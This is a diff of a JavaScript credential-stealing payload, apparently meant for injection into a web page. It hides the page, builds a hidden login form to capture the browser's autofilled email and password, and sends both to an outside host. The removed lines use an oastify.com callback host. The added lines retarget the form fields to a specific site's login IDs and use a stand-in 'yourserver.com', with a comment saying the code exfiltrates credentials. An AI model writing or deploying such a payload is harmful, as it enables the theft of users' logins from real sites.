@@ -11,55 +11,53 @@ var c = 'body > *:not(form):not(textarea) { display: none !important; }';
 s.appendChild(document.createTextNode(c));
 document.head.appendChild(s);
 
-
 var form = document.createElement('form');
 
-var inputName = document.createElement('input');
-inputName.type = 'text';
-inputName.id = 'username';
-inputName.name = 'username';
-inputName.autocomplete = 'username';
-inputName.placeholder = 'Check here';
-inputName.style.border = "none";
-inputName.style.outline = "none";
-inputName.style.background = "none";
-inputName.style.width = "100%";
-inputName.classList.add("single-input")
+// Change inputName to represent the email field
+var inputEmail = document.createElement('input');
+inputEmail.type = 'text';
+inputEmail.id = 'login-form-email';
+inputEmail.name = 'login-form-email';
+inputEmail.autocomplete = 'email';  // Helps trigger autofill
+inputEmail.placeholder = 'Email Address *';
+inputEmail.style.border = "none";
+inputEmail.style.outline = "none";
+inputEmail.style.background = "none";
+inputEmail.style.width = "100%";
+inputEmail.classList.add("single-input");
 
+// Change inputPassword to match the target site's field
 var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
-inputPassword.id = 'password';
-inputPassword.name = 'password';
+inputPassword.id = 'login-form-password';
+inputPassword.name = 'login-form-password';
 inputPassword.autocomplete = 'current-password';
 inputPassword.style.border = "none";
 inputPassword.style.outline = "none";
 inputPassword.style.background = "none";
 inputPassword.style.padding = "0";
 inputPassword.style.width = "1%";
-inputPassword.classList.add("single-input")
+inputPassword.classList.add("single-input");
 
-
-form.appendChild(inputName);
+form.appendChild(inputEmail);
 form.appendChild(inputPassword);
-
 document.body.appendChild(form);
 
-// Assuming you have an <input> element with an ID of "myInput"
-var inputElement = document.getElementById("username");
-
-
-
 setTimeout(function () {
-        let a = document.getElementsByName('username')[0];
-        let b = document.getElementsByName('password')[0];
-        function f() {
-          if(b.value.length>0) {
-            fetch('http://4v0frcmg9mskoccjfiptxpxgz75ytuhj.oastify.com/' + encodeURIComponent(a.value) + '&password=' + encodeURIComponent(b.value));
-          }
-       }
-        a.form.onclick=f;
-        a.onchange=f;
-        b.onchange=f;
-        a.oninput=f;
-        b.oninput=f;
-      }, 1000);
+    // Use the new field names
+    let a = document.getElementsByName('login-form-email')[0];
+    let b = document.getElementsByName('login-form-password')[0];
+
+    function f() {
+      if(b.value.length > 0) {
+        // Exfiltrate the credentials to your server
+        fetch('http://yourserver.com/' + encodeURIComponent(a.value) + '&password=' + encodeURIComponent(b.value));
+      }
+    }
+
+    a.form.onclick = f;
+    a.onchange = f;
+    b.onchange = f;
+    a.oninput = f;
+    b.oninput = f;
+}, 1000);
